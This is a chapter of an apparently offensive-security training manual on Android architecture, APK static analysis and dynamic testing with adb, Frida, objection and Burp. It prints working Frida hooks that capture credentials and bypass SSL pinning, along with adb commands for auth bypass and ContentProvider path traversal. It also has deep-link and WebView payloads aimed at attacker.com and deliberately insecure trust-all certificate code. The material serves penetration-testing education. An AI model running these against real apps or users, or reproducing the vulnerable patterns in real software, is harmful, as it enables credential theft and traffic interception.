# Chapter 21 — Mobile Security: Android Internals & APK Analysis

**VADER-RCE Field Manual**
**Prerequisite**: Ch08 Target Reversing, Ch14 Reverse Engineering, Ch16 C2
**Drill**: DRILLS/21_mobile_security/

---

## Why You Need This

Three billion Android devices. Every one of them is a computer in
someone's pocket. They carry credentials, contacts, location history,
authentication tokens, banking apps, and corporate email. They connect
to corporate WiFi. They sync to cloud services. They run code with
minimal user scrutiny — "allow this app to access contacts" is all the
trust a user grants.

The Android security model is strong in principle. App sandboxing,
mandatory permissions, cryptographic signing. In practice: the platform
has a decade of CVEs, the app ecosystem is full of badly-written software
with classic vulnerabilities, and the gap between the security model
and its actual implementation is where you operate.

This chapter covers Android from the architecture up. You need to understand
the platform before you can exploit it, analyse malware running on it, or
test applications for vulnerabilities.

Two operational contexts:

1. **APK analysis** — static and dynamic analysis of Android apps.
   Find vulnerabilities, understand malware, extract credentials and secrets.

2. **Android exploitation** — runtime instrumentation with Frida, traffic
   interception with Burp, bypass of certificate pinning and root detection.

Both contexts require the same foundational knowledge. Start with the
architecture. Everything else follows from it.

---

## Section 1 — Android Architecture

Android is a modified Linux kernel with an application framework layered
on top. Understanding each layer tells you WHERE vulnerabilities exist and
HOW to reach them.

```
ANDROID ARCHITECTURE STACK:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Layer 5: Applications (APKs)
  ├── Your target app
  ├── Other installed apps
  └── System apps (Settings, Phone, etc.)

Layer 4: Android Application Framework (Java/Kotlin)
  ├── Activity Manager, Window Manager, Package Manager
  ├── Content Providers, View System
  └── Location, Telephony, Notification managers

Layer 3: Android Runtime (ART) + Libraries
  ├── ART / Dalvik (bytecode execution engine)
  ├── WebKit (browser engine)
  ├── OpenSSL/BoringSSL (TLS/crypto)
  └── libc, libm, SQLite

Layer 2: HAL (Hardware Abstraction Layer)
  ├── Camera, Audio, Bluetooth, WiFi drivers
  └── Exposed to framework via JNI

Layer 1: Linux Kernel (modified)
  ├── Process scheduling, memory management
  ├── Binder IPC driver (critical: this is how apps communicate)
  ├── SELinux enforcement
  └── Hardware drivers
```

### Linux Kernel Base

Android runs on a modified Linux kernel. Every Android-specific security
mechanism builds on Linux fundamentals:

- **UIDs**: each installed app gets a unique UID (e.g., app with package
  `com.example.app` gets UID 10042). The kernel enforces file permission
  separation between apps via UIDs. App A cannot read App B's files because
  it doesn't have the right UID.

- **SELinux**: Mandatory Access Control enforcement. Every process, file,
  and socket has an SELinux label. Policy rules define what each label can
  do. Bypassing the app sandbox often requires a SELinux policy violation
  as well as a kernel exploit.

- **Seccomp**: system call filtering. Restricts which syscalls a process
  can make. The browser renderer is a common target for seccomp escapes
  (sandbox breakout in Chrome for Android requires defeating seccomp).

### The UID-Per-App Sandbox Model

This is the core of Android's security model and the thing all exploits
must either work within or escape from.

```
APP SANDBOX MODEL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

com.example.bankapp  → UID 10042 → /data/data/com.example.bankapp/ (owned by UID 10042)
com.example.malware  → UID 10117 → /data/data/com.example.malware/ (owned by UID 10117)

Malware app CANNOT:
  - Read /data/data/com.example.bankapp/ (wrong UID, permission denied)
  - Send arbitrary Intent to bankapp components (unless they're exported)
  - Access bankapp's SharedPreferences
  - Read bankapp's cookies/tokens

Malware app CAN:
  - Read /sdcard/ (external storage, shared)
  - Send Intents to EXPORTED components of bankapp (if any)
  - Use ACCESSIBILITY SERVICE to read screen content (dangerous permission)
  - Capture clipboard content (read_clipboard permission)
  - If device is ROOTED: everything (root = UID 0, no sandbox)
```

**Exploitation implication**: escaping the sandbox requires either:
1. A kernel vulnerability (privilege escalation to UID 0)
2. A SELinux bypass
3. A vulnerability in a privileged system service (runs as system UID, accessible via IPC)
4. Exploiting exported app components (remains within the sandbox but crosses app boundaries)

### ART / Dalvik Runtime

Android apps are written in Java/Kotlin but don't run on a JVM. They
compile to DEX (Dalvik Executable) bytecode. DEX bytecode runs on the
ART (Android Runtime) or the older Dalvik runtime.

```
COMPILATION CHAIN:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Developer code (Java/Kotlin)
    │
    ▼ javac / kotlinc
Java bytecode (.class files)
    │
    ▼ d8 / dextools
DEX bytecode (.dex files)
    │
    ▼ packaged into
APK (AndroidManifest.xml + classes.dex + resources.arsc + libs)
    │
    ▼ installed on device
ART: AOT compiles DEX to native .oat file
     OR: interprets DEX (Dalvik mode, older devices)
```

**Why this matters for reversing**: you can decompile DEX back to
Java (imperfect but readable). Tools like jadx do this automatically.
The decompiled Java is not the original source — variable names are
lost, but logic is preserved. You can read Android apps without
source code.

### Binder IPC

Android processes don't share memory. Communication between apps (and
between apps and system services) goes through the Binder kernel driver.
Binder is the backbone of the Android framework.

```
BINDER IPC MECHANISM:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

App A wants to call a method on App B's Service:
  1. App A gets a Binder reference to App B's Service (via Intent)
  2. App A marshals the call arguments into a Parcel
  3. App A sends the Parcel to the Binder driver (/dev/binder)
  4. Kernel Binder driver copies the Parcel to App B's process
  5. App B's Service receives the call, executes, marshals response
  6. Response returns the same way

The Binder driver enforces identity: calls include the CALLER UID.
This allows services to check caller permissions:
  if (Binder.getCallingUid() != TRUSTED_UID) throw SecurityException;
```

**Attack surface**: Binder IPC is exposed through Android components
(Activities, Services, Broadcast Receivers, Content Providers). If these
components are exported (accessible to other apps), their Binder interface
is an attack surface. Malformed Parcel data can cause parsing bugs.
Privilege escalation via vulnerable system services uses Binder IPC.

---

## Section 2 — APK Structure

An APK is a ZIP file. Open it with any ZIP tool. Everything inside is
your analysis target.

```
APK CONTENTS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

AndroidManifest.xml    ← BINARY XML. Must be decoded. Primary analysis target.
classes.dex            ← DEX bytecode (all Java/Kotlin code)
classes2.dex           ← additional DEX (if app uses multidex)
resources.arsc         ← compiled resource table (strings, layouts, config)
assets/                ← raw files (JS, HTML, configs, embedded files)
lib/
  armeabi-v7a/         ← native libraries for 32-bit ARM
  arm64-v8a/           ← native libraries for 64-bit ARM (most current devices)
  x86/                 ← 32-bit x86 (emulators)
  x86_64/              ← 64-bit x86 (emulators, some Chromebooks)
res/                   ← resources (icons, layout XMLs, drawables)
META-INF/
  CERT.RSA             ← signing certificate
  CERT.SF              ← signature file
  MANIFEST.MF          ← hash of all files in APK
```

### AndroidManifest.xml — Primary Analysis Target

The manifest declares EVERYTHING the app does and CAN do:
- Package name (unique app identifier)
- Permissions requested
- All components (Activities, Services, BroadcastReceivers, ContentProviders)
- Which components are exported (accessible to other apps)
- Intent filters (what Intents the app handles)
- Minimum and target API level

```
# Decode binary AndroidManifest.xml:
# Binary XML cannot be read directly — must decode
# apktool does this automatically during decompile

# Manual decode:
adb backup -noapk com.example.app    # pulls backup, contains manifest
# OR use aapt (Android Asset Packaging Tool):
aapt dump badging app.apk
aapt dump xmltree app.apk AndroidManifest.xml

# Or decode with apktool (preferred):
apktool d app.apk -o output_dir
cat output_dir/AndroidManifest.xml
```

**What to look for in the manifest:**

```xml
<!-- Dangerous permissions requested: -->
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
<!-- BIND_ACCESSIBILITY_SERVICE is the keylogger permission -->

<!-- Exported components (accessible from other apps — attack surface): -->
<activity android:name=".LoginActivity" android:exported="true">
    <!-- ANY app can start this Activity. If it contains auth bypasses — exploitable -->
</activity>

<service android:name=".SyncService" android:exported="true">
    <!-- ANY app can bind to this service and call its methods -->
</service>

<receiver android:name=".BootReceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
    <!-- Runs on device boot. Persistence mechanism for malware. -->
</receiver>

<provider android:name=".DataProvider"
          android:authorities="com.example.app.provider"
          android:exported="true">
    <!-- ANY app can query this ContentProvider -->
    <!-- Classic bug: no permission check → path traversal → local file read -->
</provider>
```

### DEX Bytecode

DEX is Android's bytecode format. All Java/Kotlin code compiles to DEX.

```
DEX FILE STRUCTURE:
  Header       → magic "dex\n035\0", file size, checksums
  String IDs   → string table (all strings in the app)
  Type IDs     → type references (class names, primitives)
  Proto IDs    → method prototypes (return type + parameter types)
  Field IDs    → field references
  Method IDs   → method references
  Class Defs   → class definitions pointing to methods and fields
  Code Items   → actual bytecode for each method

# DEX is register-based (not stack-based like JVM)
# Each method has a set of virtual registers
# Bytecode operates on these registers
```

You don't need to read raw DEX. jadx decompiles it to Java automatically.

---

## Section 3 — Static Analysis Workflow

Static analysis = read the APK without running it.

### Step 1: Decompile with apktool

apktool decodes the APK to smali (DEX assembly) and decodes binary XML.

```
# Install apktool:
# https://apktool.org/

# Decompile:
apktool d target.apk -o output/

# Output structure:
output/
  AndroidManifest.xml    ← decoded, readable
  smali/                 ← DEX as smali assembly
  res/                   ← decoded resources
  assets/                ← raw assets
  original/              ← original META-INF

# Smali is human-readable DEX assembly:
.method public onCreate(Landroid/os/Bundle;)V
    .registers 3
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    const/high16 v0, 0x7f040000
    invoke-virtual {p0, v0}, Lcom/example/app/MainActivity;->setContentView(I)V
    return-void
.end method
```

### Step 2: Decompile to Java with jadx

jadx takes the APK (or .dex file) and decompiles it to approximate Java.
Much more readable than smali.

```
# Install jadx:
# https://github.com/skylot/jadx/releases

# GUI (recommended for navigation):
jadx-gui target.apk

# CLI (for scripted analysis):
jadx -d output_java/ target.apk

# Output: Java source files under output_java/sources/
# Navigate the package structure in jadx-gui
# Use Ctrl+F to search for strings, class names, method calls
```

**jadx-gui workflow:**
1. Open APK
2. Wait for decompilation
3. Expand package tree (left panel)
4. Navigate to main classes (look for `MainActivity`, `Application`)
5. Use Text Search (Ctrl+Shift+F) to hunt for:
   - `SharedPreferences` — credential storage
   - `http://` — hardcoded URLs
   - `password`, `secret`, `key`, `token` — hardcoded credentials
   - `getExternalStorage`, `Environment.getExternalStorage` — SD card writes
   - `setJavaScriptEnabled` — WebView JS (leads to XSS/JavascriptInterface bugs)

### Step 3: Manifest Permission Audit

After decompilation, review AndroidManifest.xml:

```bash
# Extract and analyse exported components:
cat output/AndroidManifest.xml | grep -i 'exported="true"'
cat output/AndroidManifest.xml | grep -i 'uses-permission'

# List all exported Activities:
grep -A2 'exported="true"' output/AndroidManifest.xml | grep 'activity'

# List dangerous permissions:
grep -E "READ_SMS|RECORD_AUDIO|ACCESS_FINE_LOCATION|BIND_ACCESSIBILITY|READ_CALL_LOG" output/AndroidManifest.xml
```

### Step 4: Hardcoded Secrets Hunt

```bash
# In decompiled Java (jadx output):
grep -r "password\|passwd\|secret\|apikey\|api_key\|token\|bearer" output_java/ -i
grep -r "http://\|https://" output_java/ | grep -v "//schemas\|//www.w3.org\|//android"

# In assets/ (common for React Native, Flutter, Cordova apps):
find output/assets -name "*.js" | xargs grep -i "password\|secret\|apikey\|http://"
find output/assets -name "*.json" | xargs grep -i "key\|secret\|token\|url"

# In resources:
grep -r "key\|secret\|password\|token" output/res/ -i

# In native libraries (requires strings tool):
find output/lib -name "*.so" | xargs strings | grep -iE "http://|password|secret|key="
```

### Step 5: Exported Component Enumeration

For each exported component, determine:
1. What Intents does it accept?
2. Does it perform any checks on the caller?
3. Does it expose sensitive functionality?

```java
// In jadx: find exported Activity example
// Decompiled code:
public class DeepLinkActivity extends AppCompatActivity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri data = getIntent().getData();
        // BUG: no validation of 'data' URI
        String url = data.toString();
        webView.loadUrl(url);   // <- deeplink injection -> open attacker URL in WebView
    }
}

// This Activity accepts any deeplink and loads it in a WebView
// If the WebView has JavascriptInterface: RCE
// If the WebView has file:// access: local file read
```

---

## Section 4 — Dynamic Analysis

Static analysis tells you what the code can do. Dynamic analysis tells
you what it DOES when you poke it.

### adb Command Reference

adb (Android Debug Bridge) is your primary interface to a connected
device or emulator.

```bash
# Connect to device:
adb devices                    # list connected devices
adb connect 192.168.1.100:5555 # connect over network (emulator or WiFi debug)
adb -s <device_id> shell        # connect to specific device if multiple connected

# App management:
adb install app.apk            # install APK
adb install -r app.apk         # reinstall (keep data)
adb uninstall com.example.app  # uninstall
adb shell pm list packages     # list all installed packages
adb shell pm list packages -3  # third-party apps only

# File transfer:
adb push local_file /sdcard/   # push file to device
adb pull /sdcard/file ./       # pull file from device
adb pull /data/data/com.example.app/shared_prefs/ ./  # pull app data (requires root)

# Logcat (app logs):
adb logcat                               # all logs
adb logcat -s "com.example.app"         # filter to specific app
adb logcat | grep -i "password\|token\|secret\|error"

# App info:
adb shell dumpsys package com.example.app   # package info, permissions, activities
adb shell am start -n com.example.app/.MainActivity  # start specific activity

# Send Intent to exported component:
adb shell am start -a android.intent.action.VIEW -d "myapp://callback?token=STOLEN" com.example.app
adb shell am startservice -n com.example.app/.BackgroundService
adb shell am broadcast -a com.example.app.ACTION_EXPORT_DATA

# Screen capture:
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png
```

### Frida: Dynamic Instrumentation

Frida is the best tool for Android runtime analysis. It lets you inject
JavaScript into any running process, hook methods, modify return values,
bypass checks, and dump memory — all at runtime.

```bash
# Install Frida tooling:
pip install frida-tools

# Download frida-server for target architecture:
# https://github.com/frida/frida/releases
# e.g., frida-server-16.x.x-android-arm64.xz

# Push and start frida-server on device (requires root):
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Verify connection:
frida-ps -U    # list processes on USB-connected device

# Attach to running app:
frida -U -p <pid> -l hook_script.js
frida -U -n "com.example.app" -l hook_script.js

# Spawn (restart app with Frida attached from launch):
frida -U -f com.example.app -l hook_script.js --no-pause
```

**Basic Frida hook — intercept a method:**

```javascript
// hook_basic.js — log all calls to Activity.onCreate
Java.perform(function() {
    var Activity = Java.use("android.app.Activity");
    
    Activity.onCreate.overload("android.os.Bundle").implementation = function(savedInstanceState) {
        console.log("[+] Activity.onCreate called");
        console.log("    Class: " + this.$className);
        // Call original implementation:
        this.onCreate(savedInstanceState);
    };
});
```

**Hook to extract credentials from SharedPreferences:**

```javascript
// hook_sharedprefs.js — capture credentials stored in SharedPreferences
Java.perform(function() {
    var SharedPreferences = Java.use("android.app.SharedPreferencesImpl");
    
    SharedPreferences.getString.overload("java.lang.String", "java.lang.String")
        .implementation = function(key, defValue) {
            var result = this.getString(key, defValue);
            if (key.toLowerCase().includes("password") ||
                key.toLowerCase().includes("token") ||
                key.toLowerCase().includes("secret")) {
                console.log("[CREDENTIAL] Key: " + key + " = " + result);
            }
            return result;
        };
});
```

**Hook to dump network traffic (before encryption):**

```javascript
// hook_http.js — intercept OkHttp requests
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Request = Java.use("okhttp3.Request");
    
    // Hook the intercept chain to log all requests:
    var Interceptor = Java.use("okhttp3.Interceptor");
    // (More complex — see full OkHttp hook in drill files)
    
    // Quick alternative — hook URL.openConnection:
    var URL = Java.use("java.net.URL");
    URL.openConnection.overload().implementation = function() {
        console.log("[HTTP] URL opened: " + this.toString());
        return this.openConnection();
    };
});
```

### Objection: Runtime Analysis Framework

Objection wraps Frida with pre-built commands for common Android analysis
tasks. Faster for standard operations.

```bash
# Install:
pip install objection

# Launch (spawns app with Frida instrumentation):
objection -g com.example.app explore

# Inside objection REPL:
# List Activities:
android hooking list activities

# List Services:
android hooking list services

# Disable root detection:
android root disable

# Disable SSL pinning (universal bypass):
android sslpinning disable

# Dump SharedPreferences:
android preferences dump

# List SQLite databases:
android sqlite list

# Watch method calls:
android hooking watch class com.example.app.LoginManager
android hooking watch method com.example.app.LoginManager.authenticate

# Search for string in heap:
memory search --string "password"
memory dump all /tmp/heap.bin
```

### Burp Suite Proxy with Android

To intercept HTTPS traffic from Android apps, you need to:
1. Set up Burp as the proxy
2. Install Burp's CA cert on the device
3. Bypass certificate pinning (if the app implements it)

```
PROXY SETUP:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. In Burp: Proxy → Options → Add Listener → 0.0.0.0:8080
   (or use existing 127.0.0.1:8080, change to 0.0.0.0)

2. On device: Settings → WiFi → Long press current network
   → Modify → Advanced → Proxy → Manual
   → Proxy Host: <your_machine_IP>
   → Proxy Port: 8080

3. Install Burp cert:
   # Export: Burp → Proxy → Options → CA Certificate → Export → DER format
   # Push to device:
   adb push burp_cert.der /sdcard/burp_cert.cer
   # Install: Settings → Security → Install from storage → select burp_cert.cer

4. For Android 7.0+ (API 24+):
   # User-installed certs are NOT trusted by default for apps targeting API 24+
   # Must either:
   #   a) Use network_security_config.xml trick (if modifying app)
   #   b) Bypass cert pinning at runtime (Frida/objection)
   #   c) Install cert as SYSTEM cert (requires root)

# Install as system cert (rooted device):
openssl x509 -inform DER -in burp_cert.der -out burp_cert.pem
CERT_HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp_cert.pem | head -1)
cp burp_cert.pem ${CERT_HASH}.0
adb root
adb remount
adb push ${CERT_HASH}.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/${CERT_HASH}.0
adb reboot
```

---

## Section 5 — Common Android Vulnerabilities

### Exported Activities — Auth Bypass

```
VULNERABILITY:
  Activity marked android:exported="true" contains sensitive functionality
  that expects the user to be authenticated — but doesn't verify this itself.
  
EXPLOIT:
  adb shell am start -n com.victim.app/.AdminActivity
  → Opens admin panel without authentication
  → No login required because the Activity trusts it was reached legitimately

EXAMPLE CODE (vulnerable):
  // AdminActivity.java
  public class AdminActivity extends Activity {
      protected void onCreate(Bundle b) {
          // No auth check — trusts that only authenticated users can reach this
          // But it's exported! Anyone can start it directly via adb or another app.
          displayAdminPanel();
      }
  }

DETECTION: grep manifest for exported Activities, cross-reference with
  Activities that access sensitive data or admin functions
```

### Exported Content Providers — Path Traversal

```
VULNERABILITY:
  ContentProvider is exported without proper path validation.
  openFile() method allows path traversal, leaking arbitrary local files.

EXAMPLE CODE (vulnerable):
  // MyProvider.java
  public ParcelFileDescriptor openFile(Uri uri, String mode) {
      String filename = uri.getLastPathSegment();
      // VULNERABLE: no validation, allows ../../etc/hosts style traversal
      File f = new File(DATA_DIR, filename);
      return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY);
  }

EXPLOIT:
  # From another app or adb:
  adb shell content read \
    --uri "content://com.victim.app.provider/files/../../../../data/data/com.victim.app/shared_prefs/credentials.xml"

DETECTION: jadx → search for openFile() in ContentProvider subclasses,
  check for path traversal validation
```

### Insecure SharedPreferences

```
VULNERABILITY:
  App stores sensitive data (tokens, passwords, PII) in SharedPreferences
  in plaintext or with weak encoding (base64 ≠ encryption).

EXAMPLE CODE (vulnerable):
  SharedPreferences prefs = getSharedPreferences("user_data", MODE_PRIVATE);
  prefs.edit().putString("auth_token", bearerToken).apply();
  prefs.edit().putString("password", plaintext_password).apply();

DETECTION WITH OBJECTION:
  android preferences dump
  → dumps all SharedPreferences files
  → reveals plaintext credentials

DETECTION WITH ADB (rooted):
  adb pull /data/data/com.victim.app/shared_prefs/
  cat user_data.xml
```

### Improper Certificate Validation

App doesn't properly validate TLS certificates. Allows MitM interception
even without defeating certificate pinning.

```java
// VULNERABLE: trusts all certificates
TrustManager[] trustAllCerts = new TrustManager[] {
    new X509TrustManager() {
        public X509Certificate[] getAcceptedIssuers() { return null; }
        public void checkClientTrusted(X509Certificate[] certs, String authType) {}
        public void checkServerTrusted(X509Certificate[] certs, String authType) {}
        // Empty implementation = trust everything = MitM trivial
    }
};

SSLContext sc = SSLContext.getInstance("TLS");
sc.init(null, trustAllCerts, new java.security.SecureRandom());
HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

// Also look for:
HostnameVerifier allHostsValid = (hostname, session) -> true;
// ^ overrides hostname verification = any cert for any hostname accepted
```

**Detection**: jadx → search for `X509TrustManager`, `checkServerTrusted`,
`setDefaultSSLSocketFactory`, `ALLOW_ALL_HOSTNAME_VERIFIER`

### WebView addJavascriptInterface

```java
// VULNERABLE: exposes Java methods to JavaScript in WebView
webView.addJavascriptInterface(new JavaBridge(), "Android");

class JavaBridge {
    @JavascriptInterface
    public String executeCommand(String cmd) {
        // CRITICAL: this executes SHELL COMMANDS from JavaScript!
        Process p = Runtime.getRuntime().exec(cmd);
        return readStream(p.getInputStream());
    }
}

webView.setJavaScriptEnabled(true);
webView.loadUrl("https://attacker.com/xss_payload.html");
// The XSS payload calls: Android.executeCommand("id")
// → Command execution via WebView JavaScript
```

**Detection**: jadx → search for `addJavascriptInterface`. Every occurrence
is potentially exploitable if the WebView loads remote content.

**Prerequisites for exploitation**:
1. WebView has JavaScript enabled
2. WebView loads attacker-controlled content (URL, parameter, XSS)
3. Bridge method has dangerous functionality

### Deep Link Injection

```java
// VULNERABLE: exported Activity handles deep links without validation
// AndroidManifest.xml:
// <intent-filter>
//   <action android:name="android.intent.action.VIEW"/>
//   <data android:scheme="myapp" android:host="callback"/>
// </intent-filter>

public class CallbackActivity extends AppCompatActivity {
    protected void onCreate(Bundle savedInstanceState) {
        Uri data = getIntent().getData();
        // NO VALIDATION: loads any URL from the deep link
        String url = data.getQueryParameter("redirect");
        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
        // → open attacker URL in browser, or:
        webView.loadUrl(url);
        // → load attacker-controlled page in app's WebView context
    }
}

// Attack:
adb shell am start -a android.intent.action.VIEW \
    -d "myapp://callback?redirect=javascript:window.location='https://attacker.com/'"
```

---

## Section 6 — Frida SSL Pinning Bypass

Certificate pinning is an app-level check where the app verifies that
the server's certificate matches a specific certificate or public key
hash — not just any trusted CA. Bypassing it lets you intercept traffic
with Burp regardless of which CA signed your Burp cert.

### Universal SSL Pinning Bypass

The standard frida-codeshare script bypasses most common pinning implementations:

```bash
# One-liner universal bypass (covers 90%+ of implementations):
frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida \
      -U -f com.victim.app --no-pause

# Or download the script for offline use:
# https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/
```

**What it bypasses:**
- OkHttp3 CertificatePinner
- TrustManagerImpl custom implementations
- HttpsURLConnection custom TrustManagers
- Conscrypt (Android's default SSL provider) trust checks
- Apache HTTP Client
- Retrofit (which uses OkHttp)

**Using objection (wrapped Frida):**
```bash
objection -g com.victim.app explore
# Inside objection:
android sslpinning disable
# → disables SSL pinning for the running process
# → Burp now intercepts all traffic
```

### Manual Bypass (when the universal script fails)

If universal bypass doesn't work, the app uses a custom or obfuscated
pinning implementation. Find it manually:

```bash
# 1. Find pinning code in jadx:
# Search for: CertificatePinner, TrustManager, X509TrustManager, 
#             getServerCertificates, checkServerTrusted

# 2. Identify the specific method doing the pin check
# Usually: throws an exception if the cert doesn't match

# 3. Write a targeted hook:
```

```javascript
// targeted_bypass.js — hook specific custom pinning class
Java.perform(function() {
    var CustomPinner = Java.use("com.victim.app.security.CertificatePinnerImpl");
    
    // Override the verify method to always pass:
    CustomPinner.verify.overload("java.lang.String", "javax.net.ssl.SSLSession")
        .implementation = function(hostname, session) {
            console.log("[BYPASS] SSL pinning bypassed for: " + hostname);
            return true;   // always return true = pin check passes
        };
    
    // Or: overload checkServerTrusted to do nothing
    CustomPinner.checkServerTrusted.overload("[Ljava.security.cert.X509Certificate;", "java.lang.String")
        .implementation = function(chain, authType) {
            console.log("[BYPASS] checkServerTrusted bypassed");
            // Return without throwing = trust accepted
        };
});
```

---

## Analysis Workflow (End to End)

```
ANDROID APK ANALYSIS WORKFLOW:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PHASE 1 — RECONNAISSANCE (5 minutes):
  apktool d app.apk -o decoded/
  cat decoded/AndroidManifest.xml | grep -i 'exported="true"'
  cat decoded/AndroidManifest.xml | grep 'uses-permission'
  strings app.apk | grep -iE "http://|password|secret|key="

PHASE 2 — STATIC ANALYSIS (jadx):
  jadx-gui app.apk
  Navigate to main package
  Review: MainActivity, Application subclass, login/auth classes
  Search: SharedPreferences, certificate, HttpURLConnection
  Hunt: hardcoded credentials, exported components, JS interfaces

PHASE 3 — EXPORTED COMPONENT TESTING:
  For each exported Activity/Service/Provider/Receiver:
    adb shell am start/startservice/broadcast ...
    Document accessible functionality
    Test for auth bypass, injection, traversal

PHASE 4 — DYNAMIC ANALYSIS (Frida):
  frida-server running on device
  frida -U -f com.victim.app -l universal_ssl_bypass.js --no-pause
  Burp proxy configured
  Navigate app, observe intercepted traffic
  Hook specific methods as needed (credentials, tokens, logic checks)

PHASE 5 — REPORT:
  Findings per vulnerability class
  CVSS score for each finding
  Evidence: screenshots, Frida script output, Burp requests
  Remediation recommendations
```

---

## Key Terms (Add to Glossary)

| Term | Definition |
|------|-----------|
| **APK** | Android Package; ZIP file containing DEX bytecode, manifest, resources, and native libraries |
| **DEX** | Dalvik Executable; Android's bytecode format compiled from Java/Kotlin source |
| **ART** | Android Runtime; executes DEX bytecode via AOT compilation or interpretation |
| **Binder IPC** | Android's inter-process communication mechanism via /dev/binder kernel driver |
| **AndroidManifest.xml** | App configuration file declaring permissions, components, and intent filters |
| **Exported component** | Activity/Service/Receiver/Provider accessible to other apps; primary Android attack surface |
| **Intent** | Android messaging object used to start Activities, Services, or send broadcasts |
| **jadx** | Decompiler that converts DEX bytecode back to approximate Java source |
| **apktool** | Decodes APK to smali assembly and binary XML to readable formats |
| **Frida** | Dynamic instrumentation framework for hooking methods at runtime |
| **Objection** | Frida-powered runtime mobile exploration tool with pre-built Android analysis commands |
| **Certificate pinning** | App-level check verifying server cert matches hardcoded cert/key; blocks standard MitM |
| **SSL pinning bypass** | Frida script disabling certificate pinning checks at runtime to enable Burp interception |
| **SharedPreferences** | Android key-value storage; often misused for storing plaintext credentials |
| **ContentProvider** | Android component exposing structured data access; common path traversal vulnerability surface |
| **WebView JavascriptInterface** | Bridge exposing Java methods to JavaScript in a WebView; can enable RCE via XSS |
| **Deep link** | URL scheme handled by an exported Activity; injection via unvalidated parameters |

---

## Drill 21 — Mobile Security

Go to `DRILLS/21_mobile_security/`. A vulnerable sample APK (`vulnerable.apk`)
is provided — a banking app simulation with multiple intentional flaws.

Your mission:

1. **Static analysis**.
   - Decompile with apktool and jadx.
   - List all exported components.
   - Find hardcoded credentials (there are 2).
   - Find the insecure SharedPreferences usage.
   - Find the WebView JavascriptInterface vulnerability.

2. **Exported component exploitation**.
   - Send an Intent to bypass the login screen.
   - Read a file via the vulnerable ContentProvider using path traversal.
   - Trigger the exported BroadcastReceiver and document its effect.

3. **Dynamic analysis with Frida**.
   - Set up frida-server on the Android emulator.
   - Hook `SharedPreferences.getString` — capture all values read.
   - Hook the authentication method — log credentials at entry.
   - Modify the return value of `isAdminUser()` to return `true`.

4. **Traffic interception**.
   - Configure Burp proxy.
   - Run universal SSL pinning bypass.
   - Intercept a login request. Capture the token.
   - Replay the token to the API endpoint and confirm access.

5. **Write findings**.
   - One page, DREAD or CVSS score each finding.
   - Proof-of-concept for each vulnerability.
   - This is your mobile pentest report template.

Android is a computer in every pocket. Learn to read it the same way
you read anything else: find the input surfaces, trace the data paths,
look for the places where trust assumptions break.

---

— Every app is a BINARY waiting to surrender its logic —
the runtime instrumentation bends it to the analyst's will
